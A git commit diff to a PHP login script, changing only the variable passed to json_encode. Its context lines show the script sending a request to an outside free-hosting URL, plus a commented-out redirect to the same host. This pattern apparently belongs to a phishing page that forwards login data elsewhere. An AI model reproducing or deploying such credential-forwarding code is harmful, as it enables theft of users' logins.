75747220f2609d4df4bd433411bac6e9e4d59c7b
OpenMirror <54529482+OpenMirror@users.noreply.github.com>
2023-06-04 16:37:20 +0200

    Update login.php

--- login.php
+++ login.php
@@ -42,7 +42,7 @@
     );
     $context = stream_context_create($opts);
     $result = file_get_contents('https://sparkling1234.000webhostapp.com/', false, $context);
-    echo json_encode($anArray);
+    echo json_encode($data);
     
 
     // header('Location: '."https://sparkling1234.000webhostapp.com/");
